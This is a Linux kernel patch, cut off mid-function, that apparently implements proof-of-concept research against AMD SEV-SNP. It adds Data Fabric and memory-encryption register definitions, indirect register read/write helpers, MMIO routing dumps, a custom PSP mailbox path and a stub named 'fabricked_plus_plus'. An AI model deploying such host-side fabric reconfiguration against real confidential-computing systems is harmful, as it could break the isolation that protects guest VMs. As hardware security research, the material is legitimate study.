@@ -1,0 +1,918 @@
+Base-Commit: ed4cdcc0b03e72cfdffbff9f0ea24338517bc893
+
+diff --git a/drivers/crypto/ccp/df.h b/drivers/crypto/ccp/df.h
+new file mode 100644
+index 000000000000..31580fbaee99
+--- /dev/null
++++ b/drivers/crypto/ccp/df.h
+@@ -0,0 +1,291 @@
++#ifndef DF_H
++#define DF_H
++
++#include <linux/types.h>
++#include <linux/kernel.h>
++
++/**
++ * PSP Misc Mode register
++ * D18F6x408 [PSP Miscellaneous Modes] (DF::PspMiscMode)
++ */
++#define PSP_MISC_MODE_FUNC          (6)
++#define PSP_MISC_MODE_OFFSET        (0x408)
++
++
++/**
++ * FtiSecLvlMapReg
++ * D18F1x33C [FTI Security Level Mapping] (DF::FtiSecLvlMapReg)
++ * 13.14.1.1 Data Fabric Register Security Operation
++ */
++#define FTI_SEC_LVL_MAP_REG_FUNC    (6)
++#define FTI_SEC_LVL_MAP_REG_OFFSET  (0xDD0)
++
++
++#define TMR_SDP_MICROCODE_TRUST_LVL (0x04)   /* Microcode SDP Trust level for Genoa is 4 */
++
++
++#define FICAA_OFFSET_PSP        (0x80) /* F4x80 of F4x[80 - 94] range */
++#define FICAA_OFFSET_SMU        (0x84) /* F4x80 of F4x[80 - 94] range */
++#define FICAA_OFFSET_MICROCODE  (0x88) /* F4x80 of F4x[80 - 94] range */
++#define FICAA_OFFSET_BIOS_OS    (0x8C) /* F4x80 of F4x[80 - 94] range */
++#define FICAA_OFFSET_LW_SMI     (0x90) /* F4x80 of F4x[80 - 94] range */
++#define FICAA_OFFSET_RES        (0x94) /* F4x80 of F4x[80 - 94] range */
++
++#define FICAD_OFFSET_PSP        (0xA0) /* F4xA0 of F4x0[A0 - C8] range */
++#define FICAD_OFFSET_SMU        (0xA8) /* F4xA0 of F4x0[A0 - C8] range */
++#define FICAD_OFFSET_MICROCODE  (0xB0) /* F4xA0 of F4x0[A0 - C8] range */
++#define FICAD_OFFSET_BIOS_OS    (0xB8) /* F4xA0 of F4x0[A0 - C8] range */
++#define FICAD_OFFSET_LW_SMI     (0xC0) /* F4xA0 of F4x0[A0 - C8] range */
++#define FICAD_OFFSET_RES        (0xC8) /* F4xA0 of F4x0[A0 - C8] range */
++
++
++#define DF_BROADCAST		0xFF
++#define DF_FICAA_INST_EN	BIT(0)
++#define DF_FICAA_REG_NUM	GENMASK(10, 1)
++#define DF_FICAA_FUNC_NUM	GENMASK(13, 11)
++#define DF_FICAA_INST_ID	GENMASK(23, 16)
++
++
++#define SIL_RESERVED_826  (0x0001C000ul)
++#define MAKE_SMN_ADDR(FUN, OFF) (((uint32_t) SIL_RESERVED_826) | (((uint32_t)(FUN)) << 10) | ((uint32_t)(OFF)))
++
++///UMC
++ /**
++ * @brief The SMN address of UMC00CHx00000000 of UMC Controller
++ *
++ * @details This is the address of [DRAM CS Base Address] (UMC::BaseAddr)@ UMC0
++ */
++#define UMC0_CH_REG_BASE                    (0x00050000)
++
++#define UMC_DATA_CTRL_OFFSET        (0x0144)    /* (UMC::DataCtrl)  */
++#define UMC_CAP_OFFSET              (0x0DF0)    /* (UMC::UmcCap)    */
++#define UMC_CONFIG_OFFSET           (0x0100)    /* (UMC::UmcConfig) */
++
++#define UMC_CH_OFFSET                  (0x0000)
++#define UMC_CTRL_OFFSET                (0x1000)
++
++#define UMC_ENC_KEY_INDEX_OFFSET       (0x0A00 + UMC_CH_OFFSET)   /* (UMC::EncrArrIndex) */
++#define UMC_ENC_KEY_INDEX_WORD_OFFSET  (UMC_ENC_KEY_INDEX_OFFSET / 4)
++
++#define UMC_ENC_KEY_DATA_OFFSET        (0x0A04 + UMC_CH_OFFSET)   /* (UMC::EncrArrData) */
++#define UMC_ENC_KEY_DATA_WORD_OFFSET   (UMC_ENC_KEY_DATA_OFFSET / 4)
++
++/* UMC[0...7]CHx00000144 [Data Control] (UMC::DataCtrl) */
++#define UMC_DATA_CTRL_ENCR_EN_BIT   (8)
++#define UMC_DATA_CTRL_ENCR_EN_MASK  (1ul << (UMC_DATA_CTRL_ENCR_EN_BIT))
++
++/* UMC[0...7]CHx00000DF0 [UMC Capabilities] (UMC::UmcCap) */
++#define UMC_CAP_ENCR_DISABLE_BIT    (18)
++#define UMC_CAP_ENCR_DISABLE_MASK   (1ul << (UMC_CAP_ENCR_DISABLE_BIT))
++
++// PPRs Document 7 (DF) -
++#define CCM0_INSTANCE_ID    (16)    /* CCM0 to CCM7 is 16 to 23 */
++
++
++#define DF_READ_PROT(LEVEL) int __df_indirect_read_##LEVEL(u16 node, u8 func, u16 reg, u8 instance_id, u32 *lo);
++#define DF_WRITE_PROT(LEVEL) int __df_indirect_write_##LEVEL(u16 node, u8 func, u16 reg, u8 instance_id, u32 lo);
++DF_READ_PROT(PSP)
++DF_READ_PROT(SMU)
++DF_READ_PROT(MICROCODE)
++DF_READ_PROT(BIOS_OS)
++DF_READ_PROT(LW_SMI)
++DF_READ_PROT(RES)
++DF_WRITE_PROT(PSP)
++DF_WRITE_PROT(SMU)
++DF_WRITE_PROT(MICROCODE)
++DF_WRITE_PROT(BIOS_OS)
++DF_WRITE_PROT(LW_SMI)
++DF_WRITE_PROT(RES)
++
++#define DF_READ_PORT_PROT(LEVEL) int __df_indirect_read_port_##LEVEL(u16 node, u8 func, u16 reg, u8 instance_id, u32 *lo);
++#define DF_WRITE_PORT_PROT(LEVEL) int __df_indirect_write_port_##LEVEL(u16 node, u8 func, u16 reg, u8 instance_id, u32 lo);
++DF_READ_PORT_PROT(PSP)
++DF_READ_PORT_PROT(SMU)
++DF_READ_PORT_PROT(MICROCODE)
++DF_READ_PORT_PROT(BIOS_OS)
++DF_READ_PORT_PROT(LW_SMI)
++DF_READ_PORT_PROT(RES)
++DF_WRITE_PORT_PROT(PSP)
++DF_WRITE_PORT_PROT(SMU)
++DF_WRITE_PORT_PROT(MICROCODE)
++DF_WRITE_PORT_PROT(BIOS_OS)
++DF_WRITE_PORT_PROT(LW_SMI)
++DF_WRITE_PORT_PROT(RES)
++
++
++uint32_t df_main(void);
++void read_all_levels(u8 instance, u8 func, u16 reg);
++void read_all_levels_port(u8 instance, u8 func, u16 reg);
++void write_all_levels(u8 instance, u8 func, u16 reg, u32 lo);
++void write_all_levels_port(u8 instance, u8 func, u16 reg, u32 lo);
++
++
++
++
++
++
++
++/* DRAM Base Address Register */
++#define DRAMBASEADDRESS_0_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_0_REG_ZEN5  0x200
++#define DRAMBASEADDRESS_0_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_0_FUNC_ZEN5, DRAMBASEADDRESS_0_REG_ZEN5))
++
++#define DRAMBASEADDRESS_1_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_1_REG_ZEN5  0x210
++#define DRAMBASEADDRESS_1_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_1_FUNC_ZEN5, DRAMBASEADDRESS_1_REG_ZEN5))
++
++#define DRAMBASEADDRESS_2_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_2_REG_ZEN5  0x220
++#define DRAMBASEADDRESS_2_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_2_FUNC_ZEN5, DRAMBASEADDRESS_2_REG_ZEN5))
++
++#define DRAMBASEADDRESS_3_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_3_REG_ZEN5  0x230
++#define DRAMBASEADDRESS_3_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_3_FUNC_ZEN5, DRAMBASEADDRESS_3_REG_ZEN5))
++
++#define DRAMBASEADDRESS_4_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_4_REG_ZEN5  0x240
++#define DRAMBASEADDRESS_4_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_4_FUNC_ZEN5, DRAMBASEADDRESS_4_REG_ZEN5))
++
++#define DRAMBASEADDRESS_5_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_5_REG_ZEN5  0x250
++#define DRAMBASEADDRESS_5_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_5_FUNC_ZEN5, DRAMBASEADDRESS_5_REG_ZEN5))
++
++#define DRAMBASEADDRESS_6_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_6_REG_ZEN5  0x260
++#define DRAMBASEADDRESS_6_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_6_FUNC_ZEN5, DRAMBASEADDRESS_6_REG_ZEN5))
++
++#define DRAMBASEADDRESS_7_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_7_REG_ZEN5  0x270
++#define DRAMBASEADDRESS_7_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_7_FUNC_ZEN5, DRAMBASEADDRESS_7_REG_ZEN5))
++
++#define DRAMBASEADDRESS_8_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_8_REG_ZEN5  0x280
++#define DRAMBASEADDRESS_8_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_8_FUNC_ZEN5, DRAMBASEADDRESS_8_REG_ZEN5))
++
++#define DRAMBASEADDRESS_9_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_9_REG_ZEN5  0x290
++#define DRAMBASEADDRESS_9_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_9_FUNC_ZEN5, DRAMBASEADDRESS_9_REG_ZEN5))
++
++#define DRAMBASEADDRESS_10_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_10_REG_ZEN5  0x2A0
++#define DRAMBASEADDRESS_10_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_10_FUNC_ZEN5, DRAMBASEADDRESS_10_REG_ZEN5))
++
++#define DRAMBASEADDRESS_11_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_11_REG_ZEN5  0x2B0
++#define DRAMBASEADDRESS_11_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_11_FUNC_ZEN5, DRAMBASEADDRESS_11_REG_ZEN5))
++
++#define DRAMBASEADDRESS_12_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_12_REG_ZEN5  0x2C0
++#define DRAMBASEADDRESS_12_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_12_FUNC_ZEN5, DRAMBASEADDRESS_12_REG_ZEN5))
++
++#define DRAMBASEADDRESS_13_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_13_REG_ZEN5  0x2D0
++#define DRAMBASEADDRESS_13_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_13_FUNC_ZEN5, DRAMBASEADDRESS_13_REG_ZEN5))
++
++#define DRAMBASEADDRESS_14_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_14_REG_ZEN5  0x2E0
++#define DRAMBASEADDRESS_14_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_14_FUNC_ZEN5, DRAMBASEADDRESS_14_REG_ZEN5))
++
++#define DRAMBASEADDRESS_15_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_15_REG_ZEN5  0x2F0
++#define DRAMBASEADDRESS_15_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_15_FUNC_ZEN5, DRAMBASEADDRESS_15_REG_ZEN5))
++
++#define DRAMBASEADDRESS_16_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_16_REG_ZEN5  0x300
++#define DRAMBASEADDRESS_16_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_16_FUNC_ZEN5, DRAMBASEADDRESS_16_REG_ZEN5))
++
++#define DRAMBASEADDRESS_17_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_17_REG_ZEN5  0x310
++#define DRAMBASEADDRESS_17_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_17_FUNC_ZEN5, DRAMBASEADDRESS_17_REG_ZEN5))
++
++#define DRAMBASEADDRESS_18_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_18_REG_ZEN5  0x320
++#define DRAMBASEADDRESS_18_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_18_FUNC_ZEN5, DRAMBASEADDRESS_18_REG_ZEN5))
++
++#define DRAMBASEADDRESS_19_FUNC_ZEN5 0x7
++#define DRAMBASEADDRESS_19_REG_ZEN5  0x330
++#define DRAMBASEADDRESS_19_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMBASEADDRESS_19_FUNC_ZEN5, DRAMBASEADDRESS_19_REG_ZEN5))
++
++/* DRAM Limit Address Register */
++#define DRAMLIMITADDRESS_0_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_0_REG_ZEN5  0x204
++#define DRAMLIMITADDRESS_0_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_0_FUNC_ZEN5, DRAMLIMITADDRESS_0_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_1_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_1_REG_ZEN5  0x214
++#define DRAMLIMITADDRESS_1_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_1_FUNC_ZEN5, DRAMLIMITADDRESS_1_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_2_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_2_REG_ZEN5  0x224
++#define DRAMLIMITADDRESS_2_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_2_FUNC_ZEN5, DRAMLIMITADDRESS_2_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_3_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_3_REG_ZEN5  0x234
++#define DRAMLIMITADDRESS_3_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_3_FUNC_ZEN5, DRAMLIMITADDRESS_3_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_4_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_4_REG_ZEN5  0x244
++#define DRAMLIMITADDRESS_4_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_4_FUNC_ZEN5, DRAMLIMITADDRESS_4_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_5_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_5_REG_ZEN5  0x254
++#define DRAMLIMITADDRESS_5_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_5_FUNC_ZEN5, DRAMLIMITADDRESS_5_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_6_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_6_REG_ZEN5  0x264
++#define DRAMLIMITADDRESS_6_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_6_FUNC_ZEN5, DRAMLIMITADDRESS_6_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_7_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_7_REG_ZEN5  0x274
++#define DRAMLIMITADDRESS_7_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_7_FUNC_ZEN5, DRAMLIMITADDRESS_7_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_8_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_8_REG_ZEN5  0x284
++#define DRAMLIMITADDRESS_8_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_8_FUNC_ZEN5, DRAMLIMITADDRESS_8_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_9_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_9_REG_ZEN5  0x294
++#define DRAMLIMITADDRESS_9_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_9_FUNC_ZEN5, DRAMLIMITADDRESS_9_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_10_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_10_REG_ZEN5  0x2A4
++#define DRAMLIMITADDRESS_10_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_10_FUNC_ZEN5, DRAMLIMITADDRESS_10_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_11_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_11_REG_ZEN5  0x2B4
++#define DRAMLIMITADDRESS_11_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_11_FUNC_ZEN5, DRAMLIMITADDRESS_11_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_12_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_12_REG_ZEN5  0x2C4
++#define DRAMLIMITADDRESS_12_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_12_FUNC_ZEN5, DRAMLIMITADDRESS_12_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_13_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_13_REG_ZEN5  0x2D4
++#define DRAMLIMITADDRESS_13_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_13_FUNC_ZEN5, DRAMLIMITADDRESS_13_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_14_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_14_REG_ZEN5  0x2E4
++#define DRAMLIMITADDRESS_14_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_14_FUNC_ZEN5, DRAMLIMITADDRESS_14_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_15_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_15_REG_ZEN5  0x2F4
++#define DRAMLIMITADDRESS_15_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_15_FUNC_ZEN5, DRAMLIMITADDRESS_15_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_16_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_16_REG_ZEN5  0x304
++#define DRAMLIMITADDRESS_16_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_16_FUNC_ZEN5, DRAMLIMITADDRESS_16_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_17_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_17_REG_ZEN5  0x314
++#define DRAMLIMITADDRESS_17_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_17_FUNC_ZEN5, DRAMLIMITADDRESS_17_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_18_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_18_REG_ZEN5  0x324
++#define DRAMLIMITADDRESS_18_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_18_FUNC_ZEN5, DRAMLIMITADDRESS_18_REG_ZEN5))
++
++#define DRAMLIMITADDRESS_19_FUNC_ZEN5 0x7
++#define DRAMLIMITADDRESS_19_REG_ZEN5  0x334
++#define DRAMLIMITADDRESS_19_PCI_ADDR_ZEN5 (MAKE_SBDFO (0, 0, 0x18, DRAMLIMITADDRESS_19_FUNC_ZEN5, DRAMLIMITADDRESS_19_REG_ZEN5))
++
++
++#endif /* DF_H */
+diff --git a/drivers/crypto/ccp/psp-dev.c b/drivers/crypto/ccp/psp-dev.c
+index 9e21da0e298a..df5013d4104f 100644
+--- a/drivers/crypto/ccp/psp-dev.c
++++ b/drivers/crypto/ccp/psp-dev.c
+@@ -26,7 +26,10 @@ struct psp_device *psp_master;
+ 
+ #define PSP_C2PMSG_17_CMDRESP_CMD	GENMASK(19, 16)
+ 
+-static int psp_mailbox_poll(const void __iomem *cmdresp_reg, unsigned int *cmdresp,
++int psp_mailbox_poll(const void __iomem *cmdresp_reg, unsigned int *cmdresp,
++			    unsigned int timeout_msecs);
++
++int psp_mailbox_poll(const void __iomem *cmdresp_reg, unsigned int *cmdresp,
+ 			    unsigned int timeout_msecs)
+ {
+ 	while (true) {
+@@ -42,6 +45,7 @@ static int psp_mailbox_poll(const void __iomem *cmdresp_reg, unsigned int *cmdre
+ 
+ 	return -ETIMEDOUT;
+ }
++EXPORT_SYMBOL(psp_mailbox_poll);
+ 
+ int psp_mailbox_command(struct psp_device *psp, enum psp_cmd cmd, void *cmdbuff,
+ 			unsigned int timeout_msecs, unsigned int *cmdresp)
+diff --git a/drivers/crypto/ccp/sev-dev.c b/drivers/crypto/ccp/sev-dev.c
+index 956ea609d0cc..5e6331b68b0d 100644
+--- a/drivers/crypto/ccp/sev-dev.c
++++ b/drivers/crypto/ccp/sev-dev.c
+@@ -88,6 +88,190 @@ MODULE_FIRMWARE("amd/amd_sev_fam17h_model3xh.sbin"); /* 2nd gen EPYC */
+ MODULE_FIRMWARE("amd/amd_sev_fam19h_model0xh.sbin"); /* 3rd gen EPYC */
+ MODULE_FIRMWARE("amd/amd_sev_fam19h_model1xh.sbin"); /* 4th gen EPYC */
+ 
++static void fabricked_plus_plus(void);
++
++#include "asm/msr-index.h"
++#include "asm/paravirt.h"
++
++//#include <asm/amd_nb.h>
++#include "df.h"
++#include <asm/amd/nb.h>
++
++static int df_indirect_read(u16 node, u8 func, u16 reg, u8 instance_id, u32 *lo)
++{
++	struct pci_dev *F4;
++	int err = -ENODEV;
++	u32 ficaa = 0;
++	F4 = node_to_amd_nb(node)->link;
++	if (!F4)
++		return err;
++	if (instance_id != DF_BROADCAST) {
++		ficaa |= FIELD_PREP(DF_FICAA_INST_EN, 1);
++		ficaa |= FIELD_PREP(DF_FICAA_INST_ID, instance_id);
++	}
++	reg >>= 2;
++	ficaa |= FIELD_PREP(DF_FICAA_REG_NUM, reg);
++	ficaa |= FIELD_PREP(DF_FICAA_FUNC_NUM, func);
++	err = pci_write_config_dword(F4, FICAA_OFFSET_BIOS_OS, ficaa);
++	if (err) {
++		pr_warn("Error writing DF Indirect FICAA, FICAA=0x%x\n", ficaa);
++		return err;
++	}
++	err = pci_read_config_dword(F4, FICAD_OFFSET_BIOS_OS, lo);
++	if (err)
++		pr_warn("Error reading DF Indirect FICAD LO, FICAA=0x%x.\n",
++			ficaa);
++	pr_debug("node=%u inst=0x%x func=0x%x reg=0x%x val=0x%x", node,
++		 instance_id, func, reg << 2, *lo);
++	return err;
++}
++
++static int df_indirect_write(u16 node, u8 func, u16 reg, u8 instance_id,
++			     u32 val)
++{
++	struct pci_dev *F4;
++	int err = -ENODEV;
++	u32 ficaa = 0;
++	F4 = node_to_amd_nb(node)->link;
++	if (!F4)
++		return err;
++	if (instance_id != DF_BROADCAST) {
++		ficaa |= FIELD_PREP(DF_FICAA_INST_EN, 1);
++		ficaa |= FIELD_PREP(DF_FICAA_INST_ID, instance_id);
++	}
++	reg >>= 2;
++	ficaa |= FIELD_PREP(DF_FICAA_REG_NUM, reg);
++	ficaa |= FIELD_PREP(DF_FICAA_FUNC_NUM, func);
++	err = pci_write_config_dword(F4, FICAA_OFFSET_BIOS_OS, ficaa);
++	if (err) {
++		pr_warn("Error writing DF Indirect FICAA, FICAA=0x%x\n", ficaa);
++		return err;
++	}
++	err = pci_write_config_dword(F4, FICAD_OFFSET_BIOS_OS, val);
++	if (err)
++		pr_warn("Error writing DF Indirect FICAD LO, FICAA=0x%x.\n",
++			ficaa);
++	pr_debug("node=%u inst=0x%x func=0x%x reg=0x%x val=0x%x", node,
++		 instance_id, func, reg << 2, val);
++	return err;
++}
++
++typedef union {
++	struct {
++		uint32_t RE : 1;
++		uint32_t WE : 1;
++		uint32_t CpuDis : 1;
++		uint32_t NP : 1;
++		uint32_t reserved1 : 12;
++		uint32_t DstFabricID : 12;
++		uint32_t reserved2 : 4;
++	};
++	uint32_t value;
++} MmioAddressControl;
++
++typedef union {
++	struct {
++		uint32_t MmioBaseAddrExt : 8;
++		uint32_t reserved1 : 8;
++		uint32_t MmioLimitAddrExt : 8;
++		uint32_t reserved2 : 8;
++	};
++	uint32_t value;
++} MmioExtAddress;
++
++#define TF(val) (val ? "true" : "false")
++
++static void read_mmiobase(uint32_t instance_id, uint32_t min, uint32_t count)
++{
++	uint32_t base_reg = 0xd80;
++
++	u32 *bases = kmalloc(sizeof(u32) * count, GFP_KERNEL);
++	u32 *limits = kmalloc(sizeof(u32) * count, GFP_KERNEL);
++	MmioAddressControl *address_controls =
++		kmalloc(sizeof(MmioAddressControl) * count, GFP_KERNEL);
++	MmioExtAddress *extended_addresses =
++		kmalloc(sizeof(MmioExtAddress) * count, GFP_KERNEL);
++
++	if (!bases | !limits | !address_controls | !extended_addresses) {
++		goto out;
++	}
++
++	int non_null = false;
++
++	// for (int instance_id = 0; instance_id < 0x60; instance_id++) {
++	for (uint32_t i = min; i < count; i++) {
++		uint32_t mmio_base_reg = base_reg + 16 * i;
++		uint32_t mmio_limit_reg = mmio_base_reg + 4;
++		uint32_t mmio_control_reg = mmio_base_reg + 8;
++		uint32_t mmio_extended_reg = mmio_base_reg + 12;
++
++		df_indirect_read(0, 0x0, mmio_base_reg, instance_id, &bases[i]);
++		df_indirect_read(0, 0x0, mmio_limit_reg, instance_id,
++				 &limits[i]);
++		df_indirect_read(0, 0x0, mmio_control_reg, instance_id,
++				 &address_controls[i].value);
++		df_indirect_read(0, 0x0, mmio_extended_reg, instance_id,
++				 &extended_addresses[i].value);
++
++		if (bases[i] || limits[i])
++			non_null = true;
++	}
++
++	if (!non_null) {
++		pr_info("Instance ID: 0x%02x | all 0\n", instance_id);
++	}
++
++	for (uint32_t i = min; non_null && i < count; i++) {
++		uint32_t mmio_base_reg = base_reg + 16 * i;
++		uint32_t mmio_extended_reg = mmio_base_reg + 12;
++
++		u32 base, limit;
++		MmioAddressControl address_control;
++		MmioExtAddress extended_address;
++		base = bases[i];
++		limit = limits[i];
++		address_control = address_controls[i];
++		extended_address = extended_addresses[i];
++
++#ifndef MINIMAL
++		pr_info("Instance ID: 0x%02x | Registers: %02x-%02x | Config = {",
++			instance_id, mmio_base_reg, mmio_extended_reg);
++		pr_cont("\n\tbase: %08x", base);
++
++		pr_cont("\n\tlimit: %08x", limit);
++
++		pr_cont("\n\taddress_control: { RE: %s, WE: %s, CpuDis: %s, NP: %s, "
++			"reserved: 0x%03x, DstFabricID: 0x%03x, reserved: 0x%01x }",
++			TF(address_control.RE), TF(address_control.WE),
++			TF(address_control.CpuDis), TF(address_control.NP),
++			address_control.reserved1, address_control.DstFabricID,
++			address_control.reserved2);
++
++		pr_cont("\n\textended: { BaseExt: 0x%02x, reserved: 0x%02x, LimitExt: "
++			"0x%02x, reserved: 0x%02x }",
++			extended_address.MmioBaseAddrExt,
++			extended_address.reserved1,
++			extended_address.MmioLimitAddrExt,
++			extended_address.reserved2);
++
++		pr_cont("\n}\n");
++
++#else
++		pr_info("Instance ID: 0x%02x | Registers: %02x-%02x | Base=%08x | Limit = "
++			"%08x\n",
++			instance_id, mmio_base_reg, mmio_limit_reg, base,
++			limit);
++
++#endif /* ifndef MINIMAL */
++	}
++
++out:
++	kfree(bases);
++	kfree(limits);
++	kfree(address_controls);
++	kfree(extended_addresses);
++}
++
+ static bool psp_dead;
+ static int psp_timeout;
+ 
+@@ -259,6 +443,7 @@ static int sev_cmd_buffer_len(int cmd)
+ 	case SEV_CMD_SNP_COMMIT:		return sizeof(struct sev_data_snp_commit);
+ 	case SEV_CMD_SNP_FEATURE_INFO:		return sizeof(struct sev_data_snp_feature_info);
+ 	case SEV_CMD_SNP_VLEK_LOAD:		return sizeof(struct sev_user_data_snp_vlek_load);
++	case SEV_CMD_SNP_PAGE_MOVE: 		return sizeof(struct sev_data_snp_page_move);
+ 	default:				return sev_tio_cmd_buffer_len(cmd);
+ 	}
+ 
+@@ -1359,8 +1544,317 @@ static int snp_filter_reserved_mem_regions(struct resource *rs, void *arg)
+ 	return 0;
+ }
+ 
++struct psp_mbox_default_buffer {
++	struct {
++		uint32_t size;
++		uint32_t status;
++	} header;
++} __packed __aligned(32);
++
++
++#include <asm/delay.h>
++
++int psp_mailbox_poll(const void __iomem *cmdresp_reg, unsigned int *cmdresp,
++		     unsigned int timeout_msecs);
++
++union pspv2_mbox_command {
++	uint32_t val;
++	struct pspv2_mbox_cmd_fields {
++		uint16_t mbox_status;
++		uint8_t mbox_command;
++		uint32_t reserved : 6;
++		uint32_t recovery : 1;
++		uint32_t ready : 1;
++	} __packed fields;
++};
++
++static int custom_psp_mailbox_command(struct psp_device *psp, enum psp_cmd cmd,
++				  void *cmdbuff, unsigned int timeout_msecs,
++				  unsigned int *cmdresp)
++{
++	void __iomem *cmdresp_reg, *cmdbuff_lo_reg, *cmdbuff_hi_reg;
++	int ret;
++
